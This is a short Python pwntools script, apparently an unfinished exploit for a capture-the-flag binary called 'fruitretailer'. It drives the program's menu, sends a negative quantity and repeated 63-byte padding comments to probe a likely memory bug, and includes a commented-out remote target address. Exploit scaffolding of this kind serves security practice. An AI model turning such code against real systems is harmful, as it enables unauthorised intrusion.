#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *

context(arch="amd64", os="linux", endian="little")
context.log_level="DEBUG"


class Pwn:
    def __init__(self):
        self.e = ELF("./fruitretailer")
        self.p = None

    def start_binary(self):
        self.p = process(["./fruitretailer"])
#        self.p = remote("125.235.240.167", 5000)
        self.p.recvuntil("choice:")

    def buy_fruit(self, types, quantity, comment):
        self.p.sendline("1")
        self.p.recvuntil("(2)?:")
        self.p.sendline(str(types))
        self.p.recvuntil("quantity:")
        self.p.sendline(str(quantity))
        self.p.recvuntil("? (Y/N)")
        self.p.sendline("Y")
        self.p.sendline(comment)
        self.p.recvuntil("choice:")

    def show(self):
        self.p.sendline("2")
        self.p.recvuntil("choice:")

    def edit_label(self, index, label):
        self.p.sendline("3")
        self.p.recvuntil("change:")
        self.p.sendline(str(index))
        self.p.recvuntil("label:")
        self.p.sendline(label)
        self.p.recvuntil("choice :")

    def edit_comment(self, index, address):
        self.p.sendline("4")
        self.p.recvuntil("change:")
        self.p.sendline(str(index))
        self.p.recvuntil("address:")
        self.p.sendline(address)
        self.p.recvuntil("choice :")

    def exit(self):
        self.p.sendline("5")

    def pwn_binary(self):
        self.start_binary()

        pause()
        for i in xrange(1, 50):
            self.buy_fruit(2, -1, "A"*63)
        self.show()

        self.p.interactive()
        self.p.close()


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
